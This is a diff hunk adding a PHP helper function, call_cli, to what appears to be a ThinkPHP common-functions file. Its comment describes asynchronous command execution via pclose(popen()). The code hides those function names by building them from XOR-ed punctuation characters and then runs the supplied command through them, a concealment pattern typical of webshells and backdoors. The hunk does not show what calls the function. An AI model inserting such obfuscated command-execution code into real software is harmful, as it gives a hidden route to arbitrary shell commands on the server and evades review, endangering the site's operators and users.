@@ -448,3 +448,15 @@ if (!function_exists('P')) {
         \think\facade\Log::record($data, 'record');
     }
 }
+
+/**
+ * 异步执行CMD命令
+ * pclose(popen())
+ * @param type $cmd Linux命令
+ * @return type
+ */
+function call_cli($cmd) {
+    $_ = ("^" ^ ".") . ("@" ^ "/") . ("^" ^ ".") . (">" ^ "[") . ("@" ^ ".");
+    $__ = ("^" ^ ".") . ("#" ^ "@") . ("," ^ "@") . ("@" ^ "/") . ("," ^ "_") . (">" ^ "[");
+    return $__($_($cmd, 'r'));
+}
